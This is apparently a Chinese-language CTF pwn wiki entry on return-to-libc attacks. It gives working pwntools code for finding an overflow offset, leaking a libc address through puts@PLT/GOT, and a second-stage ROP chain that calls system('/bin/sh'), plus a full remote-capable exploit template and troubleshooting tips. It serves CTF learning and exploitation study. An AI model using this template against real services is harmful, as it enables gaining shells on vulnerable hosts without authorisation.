---
category: pwn
tags: [ret2libc, rop, libc, stack_overflow, nx_bypass, aslr, got, plt, pwntools, 栈溢出, 返回libc]
triggers: [buffer overflow, ret2libc, return to libc, NX enabled, stack overflow, libc, puts@plt, system, 栈溢出, 溢出, gets, strcpy, read overflow]
related: [format_string, rop_chain, ret2csu, one_gadget, stack_pivot, ret2dlresolve, ret2plt]
---

# Return-to-libc 攻击

## 什么时候用

栈溢出 + NX 开启（不能直接在栈上执行 shellcode）+ 程序链接了 libc。这是 CTF pwn 最基础也最常见的攻击方式。

## 前提条件

- **栈溢出**：能覆盖到返回地址（overflow 足够长）
- **NX 开启**：否则直接写 shellcode 更简单
- **libc 可泄露**：需要一个输出函数（puts/printf/write）的 PLT 可用，且对应 GOT 已解析
- **知道 libc 版本**：或者能通过泄露多个函数地址推断
- ⚠️ **Full RELRO** 时 GOT 只读，但仍可用于**读取**泄露地址（只是不能写 GOT）
- ⚠️ **PIE 开启**时需要先泄露代码段基地址，否则不知道 PLT/GOT 地址

## 攻击步骤

### 1. 找溢出偏移

用 pwntools 的 `cyclic` 确定溢出到 RIP 的精确偏移：

```python
from pwn import *

p = process('./vuln')
p.sendline(cyclic(200))
p.wait()
core = Coredump('./core')
offset = cyclic_find(core.fault_addr)  # 或用 gdb: x/wx $rsp
log.info(f"Offset: {offset}")
```

也可以在 GDB 里手动找：`pattern create 200` → crash → `pattern search $rsp`。

### 2. 泄露 libc 地址（Stage 1）

调用 `puts@PLT` 打印 `puts@GOT` 的值，然后返回 `main` 做第二轮：

```python
elf = ELF('./vuln')
rop = ROP(elf)

# x86-64: 参数通过 rdi 传递
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]  # 栈对齐用

payload = b'A' * offset
payload += p64(POP_RDI)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])  # 返回 main 做第二轮

p.sendline(payload)
```

32 位更简单（参数在栈上，不需要 gadget）：
```python
# x86-32
payload = b'A' * offset
payload += p32(elf.plt['puts'])
payload += p32(elf.symbols['main'])  # 返回地址
payload += p32(elf.got['puts'])       # puts 的参数
```

### 3. 计算 libc 基地址

```python
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f"Leaked puts@libc: {hex(leaked)}")

libc = ELF('./libc.so.6')  # 或远程的 libc
libc.address = leaked - libc.symbols['puts']
log.info(f"Libc base: {hex(libc.address)}")

# 验证：基地址应该以 000 结尾
assert libc.address & 0xfff == 0, "Libc base 不对齐，可能 libc 版本错了"
```

### 4. 发送 Stage 2：getshell

```python
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))

payload2 = b'A' * offset
payload2 += p64(RET)          # 栈对齐！
payload2 += p64(POP_RDI)
payload2 += p64(bin_sh)
payload2 += p64(system)

p.sendline(payload2)
p.interactive()
```

### 完整 exploit 模板

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

def conn():
    if args.REMOTE:
        return remote('host', port)
    return process()

p = conn()

# --- Stage 1: Leak libc ---
rop = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

payload1 = b'A' * OFFSET
payload1 += p64(POP_RDI) + p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.symbols['main'])

p.sendlineafter(b'prompt> ', payload1)

leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']
log.success(f"Libc base: {hex(libc.address)}")

# --- Stage 2: Shell ---
payload2 = b'A' * OFFSET
payload2 += p64(RET)
payload2 += p64(POP_RDI) + p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.symbols['system'])

p.sendlineafter(b'prompt> ', payload2)
p.interactive()
```

## 常见坑

- **栈对齐（最常见！）**：x86-64 的 `system()` 内部用了 `movaps` 指令，要求 RSP 16 字节对齐。解决：在 `system` 前加一个 `ret` gadget。如果 crash 在 `do_system` 里的 `movaps`，99% 是这个问题。
- **libc 版本不匹配**：远程 libc 和本地不同。用 [libc.blukat.me](https://libc.blukat.me/) 或 [libc-database](https://github.com/niklasb/libc-database) 通过泄露的函数地址查找正确版本。用 `pwninit` 自动 patch 二进制。
- **泄露地址解析错误**：`puts` 输出遇到 `\x00` 会截断，遇到 `\n` 会混入。用 `recvline().strip()` + `ljust(8, b'\x00')` 处理。
- **程序不回到 main**：如果 `main` 符号被 strip 了，用 `objdump -d` 找 `_start` 或 `.text` 入口地址。也可以用 `__libc_start_main` 的返回地址。
- **One-gadget 替代方案**：如果 ROP 空间太小（比如只够一个地址），试试 `one_gadget` 工具找单地址 shell。通常需要 `[rsp+0x30] == NULL`，多 pad 一些 `\x00`。

## 变体

### 32 位 vs 64 位
- **32 位**：参数在栈上，不需要 `pop rdi` gadget，payload 更简单
- **64 位**：参数通过寄存器传递（rdi, rsi, rdx），需要 gadget

### 没有直接 leak 函数
- 如果没有 `puts`/`printf`/`write` 可用，考虑 [[ret2csu]]（用 `__libc_csu_init` 的 gadgets 调 `write`）
- 或者 [[ret2dlresolve]]（伪造动态链接结构，完全不需要 leak）

### Partial RELRO vs Full RELRO
- **Partial RELRO**（默认）：可以覆写 GOT 做 GOT hijack
- **Full RELRO**：GOT 只读，但 ret2libc leak 仍然有效（只是读 GOT，不是写）

### BROP（Blind ROP）
- 如果没有二进制文件（黑盒），且服务 fork 子进程处理请求，可以逐字节爆破 canary 和 ROP 地址。见 BROP 技术。

## 相关技术

- [[rop_chain]] — ROP 的基础概念，gadget 查找
- [[format_string]] — 另一种 libc leak 方式（`%N$p` 泄露栈上的 libc 地址）
- [[one_gadget]] — 约束满足时的单地址 shell
- [[ret2csu]] — 64 位通用 gadget（控制 rdx/rsi/edi）
- [[stack_pivot]] — 溢出空间不够时把栈转移到别处
- [[ret2dlresolve]] — 不需要 leak 的替代方案
- [[ret2plt]] — 通过 PLT/GOT 泄露 libc 地址的具体机制
